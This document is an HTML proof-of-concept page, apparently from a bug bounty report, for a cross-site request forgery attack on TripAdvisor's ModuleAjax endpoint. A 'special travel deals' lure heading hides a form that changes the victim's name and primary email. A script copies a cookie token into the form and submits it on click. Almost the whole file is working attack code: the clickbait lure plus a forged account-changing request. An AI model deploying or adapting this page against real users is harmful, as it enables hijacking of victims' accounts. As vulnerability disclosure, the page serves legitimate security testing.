<html>
<body>
  <!-- Visible click bait -->
  <h1>Click to view special travel deals!</h1>

  <!-- Hidden form -->
  <form id="csrfForm" 
        action="https://www.tripadvisor.com/ModuleAjax" 
        method="POST"
        enctype="application/x-www-form-urlencoded"
        style="display:none">
        
    <!-- Parameters from your testing -->
    <input type="hidden" name="actions" value='[{"params":{"firstname":"ziadbugcrowd","lastname":"test","primaryEmail":"ziad686@bugcrowdninja.com"},"name":"SAVE","resource":"modules.common.entity.LoggedInMember"}]'>
    <input type="hidden" name="context" value='{"modules.membercenter.model.ContributionCounts":[{"memberId":"FOY3v6GnNeOB/lMD3V9UCA=="}]}'>
    <input type="hidden" name="authenticator" value="Random">
    <input type="hidden" name="version" value="5">
    
    <!-- Token from cookie -->
    <input type="hidden" name="token" id="tokenInput">
  </form>

  <script>
    // 1. Extract token from cookie
    const token = document.cookie
      .split('; ')
      .find(row => row.startsWith('roybatty='))
      ?.split('=')[1] || '';

    document.getElementById('tokenInput').value = decodeURIComponent(token);

    // 2. Trigger form submission on user click
    document.querySelector('h1').addEventListener('click', () => {
      document.getElementById('csrfForm').submit();
    });
  </script>
</body>
</html>
